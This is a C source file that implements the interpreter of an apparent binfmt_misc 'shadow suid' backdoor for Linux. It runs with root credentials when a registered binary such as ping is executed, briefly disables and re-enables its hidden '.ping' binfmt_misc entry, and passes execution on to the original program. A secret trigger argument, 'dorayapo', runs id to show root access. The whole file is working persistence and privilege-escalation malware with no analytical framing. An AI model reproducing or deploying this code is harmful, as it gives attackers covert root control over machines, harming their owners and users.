#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/stat.h> 
#include <fcntl.h>

int main(int argc, char * argv[], char * envp[])
{
        // please notice, on some OS's id is on /bin/
        char * my_args[] = { "/usr/bin/id", NULL };
        char * new_argv[argc];

        char * binfmt_path = "/proc/sys/fs/binfmt_misc/.ping";
        char readlink_path[1024];
        char original_link[1024];
        char new_link[1024];

        int fd;
        pid_t ppid = getpid();

        int i;

        sprintf(readlink_path, "/proc/%d/exe", ppid);
        ssize_t len = readlink(readlink_path, original_link, sizeof(original_link)-1);
        if (len != -1) {
            original_link[len] = '\0';
        }
        else {
            perror("err\n");
        }

        setuid(0);
        setgid(0);

        // disable shadow suid
        fd = open(binfmt_path, O_WRONLY);
        write(fd, "0", 1);
        close(fd);

        if (fork() == 0)
        {
            while(1) // wait for parent image to change
            {
                len = readlink(readlink_path, new_link, sizeof(new_link)-1);
                if (len != -1) {
                    new_link[len] = '\0';
                }
                else {
                    break;  // probably command already exited
                }
                if (strcmp(original_link, new_link) != 0) // exe changed
                {
                    break;
                }
            }

            // enable shadow suid
            fd = open(binfmt_path, O_WRONLY);
            write(fd, "1", 1);
            close(fd);
        }
        else
        {

            if (argc == 3 && strcmp(argv[2], "dorayapo") == 0)
                execve(my_args[0], my_args, 0);
            else
            {
                for (i=0; i<argc-1; i++)
                {
                    new_argv[i] = argv[i+1];
                }
                execve(new_argv[0], new_argv, envp);
            }
        }
}
